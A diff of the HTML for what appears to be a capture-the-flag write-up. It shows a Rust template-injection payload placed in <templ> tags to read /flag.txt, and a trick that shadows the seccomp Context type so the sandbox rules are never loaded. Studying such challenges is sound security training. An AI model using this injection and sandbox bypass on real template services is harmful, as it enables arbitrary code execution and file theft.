@@ -190,40 +190,37 @@
 </code></pre></div>
 
 <p>The challenge here seems to be easy at first as we just need to place the correct rust code inside of one of the &lt;templ&gt; tags in the uploaded file to open and read the flag.txt file:</p>
-<div class="highlight"><pre><span></span><code>html:::
-<span class="nt">&lt;html&gt;</span>
-<span class="nt">&lt;title&gt;&lt;templ&gt;</span>fs::read_to_string(&quot;/flag.txt&quot;).unwrap()<span class="nt">&lt;/templ&gt;&lt;/title&gt;</span>
-<span class="nt">&lt;h1&gt;&lt;templ&gt;</span>&quot;bruh&quot;.to_string()<span class="nt">&lt;/templ&gt;&lt;/h1&gt;</span>
-<span class="nt">&lt;/html&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;&lt;</span><span class="nt">templ</span><span class="p">&gt;</span>fs::read_to_string(&quot;/flag.txt&quot;).unwrap()<span class="p">&lt;/</span><span class="nt">templ</span><span class="p">&gt;&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;&lt;</span><span class="nt">templ</span><span class="p">&gt;</span>&quot;bruh&quot;.to_string()<span class="p">&lt;/</span><span class="nt">templ</span><span class="p">&gt;&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
 </code></pre></div>
 
 <p>However this attempt fails because the rust application uses the seccomp library to limit the system calls that are allowed to do:</p>
-<div class="highlight"><pre><span></span><code><span class="nl">rust</span><span class="p">:</span><span class="o">::</span><span class="w"></span>
-<span class="k">use</span><span class="w"> </span><span class="nl">seccomp</span><span class="p">:</span><span class="err">:</span><span class="o">*</span><span class="p">;</span><span class="w"></span>
+<div class="highlight"><pre><span></span><code><span class="k">use</span><span class="w"> </span><span class="n">seccomp</span>::<span class="o">*</span><span class="p">;</span><span class="w"></span>
 
-<span class="p">...</span><span class="w"></span>
+<span class="o">..</span><span class="p">.</span><span class="w"></span>
 
-<span class="k">static</span><span class="w"> </span><span class="nl">ALLOWED</span><span class="p">:</span><span class="w"> </span><span class="o">&amp;</span><span class="err">&#39;</span><span class="k">static</span><span class="w"> </span><span class="o">[</span><span class="n">usize</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;[</span><span class="n">0, 1, 3, 11, 44,</span>
-<span class="n">                                     60, 89, 131, 202,</span>
-<span class="n">                                     231, 318</span><span class="o">]</span><span class="p">;</span><span class="w"></span>
+<span class="k">static</span><span class="w"> </span><span class="n">ALLOWED</span>: <span class="kp">&amp;</span><span class="o">&#39;</span><span class="nb">static</span> <span class="p">[</span><span class="kt">usize</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">11</span><span class="p">,</span><span class="w"> </span><span class="mi">44</span><span class="p">,</span><span class="w"></span>
+<span class="w">                                     </span><span class="mi">60</span><span class="p">,</span><span class="w"> </span><span class="mi">89</span><span class="p">,</span><span class="w"> </span><span class="mi">131</span><span class="p">,</span><span class="w"> </span><span class="mi">202</span><span class="p">,</span><span class="w"></span>
+<span class="w">                                     </span><span class="mi">231</span><span class="p">,</span><span class="w"> </span><span class="mi">318</span><span class="p">];</span><span class="w"></span>
 
-<span class="p">...</span><span class="w"></span>
+<span class="o">..</span><span class="p">.</span><span class="w"></span>
 
-<span class="n">fn</span><span class="w"> </span><span class="n">apply_seccomp</span><span class="p">()</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
-<span class="w">    </span><span class="n">let</span><span class="w"> </span><span class="n">mut</span><span class="w"> </span><span class="n">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nl">Context</span><span class="p">:</span><span class="err">:</span><span class="k">default</span><span class="p">(</span><span class="k">Action</span><span class="o">::</span><span class="n">KillProcess</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span><span class="w"></span>
-<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">ALLOWED</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
-<span class="w">        </span><span class="n">let</span><span class="w"> </span><span class="k">rule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">Rule</span><span class="o">::</span><span class="k">new</span><span class="p">(</span><span class="o">*</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="k">None</span><span class="p">,</span><span class="w"> </span><span class="k">Action</span><span class="o">::</span><span class="n">Allow</span><span class="p">);</span><span class="w"></span>
-<span class="w">        </span><span class="n">ctx</span><span class="p">.</span><span class="n">add_rule</span><span class="p">(</span><span class="k">rule</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span><span class="w"></span>
-<span class="w">    </span><span class="err">}</span><span class="w"></span>
-<span class="w">    </span><span class="n">ctx</span><span class="p">.</span><span class="k">load</span><span class="p">();</span><span class="w"></span>
-<span class="err">}</span><span class="w"></span>
+<span class="k">fn</span> <span class="nf">apply_seccomp</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Context</span>::<span class="n">default</span><span class="p">(</span><span class="n">Action</span>::<span class="n">KillProcess</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">ALLOWED</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">rule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Rule</span>::<span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="nb">None</span><span class="p">,</span><span class="w"> </span><span class="n">Action</span>::<span class="n">Allow</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="n">ctx</span><span class="p">.</span><span class="n">add_rule</span><span class="p">(</span><span class="n">rule</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="n">ctx</span><span class="p">.</span><span class="n">load</span><span class="p">();</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
 </code></pre></div>
 
 <p>By looking at the beginning of the rust_template variable we can see that the seccomp namespace is not imported but only its contents. This gives us the chance to create the same classes as provided by the lib.rs but with manipulated behaviour. By injecting our own manipulated "Context" class into the uploaded file we can prevent the rust application from applying the seccomp rules into the kernel:</p>
-<div class="highlight"><pre><span></span><code>html:::
-<span class="nt">&lt;html&gt;</span>
-<span class="nt">&lt;title&gt;&lt;templ&gt;</span>fs::read_to_string(&quot;/flag.txt&quot;).unwrap()<span class="nt">&lt;/templ&gt;&lt;/title&gt;</span>
-<span class="nt">&lt;h1&gt;&lt;templ&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;&lt;</span><span class="nt">templ</span><span class="p">&gt;</span>fs::read_to_string(&quot;/flag.txt&quot;).unwrap()<span class="p">&lt;/</span><span class="nt">templ</span><span class="p">&gt;&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;&lt;</span><span class="nt">templ</span><span class="p">&gt;</span>
   &quot;anything&quot;.to_string()
   // / 1) escape from temp1() method definition by putting a } here
 }
@@ -278,8 +275,8 @@
 // / 3) defining another method to have valid syntax - the } will be added by the app.py
 fn anyMethod() -&gt; String {
   &quot;hello&quot;.to_string()
-<span class="nt">&lt;/templ&gt;&lt;/h1&gt;</span>
-<span class="nt">&lt;/html&gt;</span>
+<span class="p">&lt;/</span><span class="nt">templ</span><span class="p">&gt;&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
 </code></pre></div>
 
 <p>Now all we need to do is upload this file and the flag will be presented to us as replacement for the first &lt;templ&gt; tag.</p>
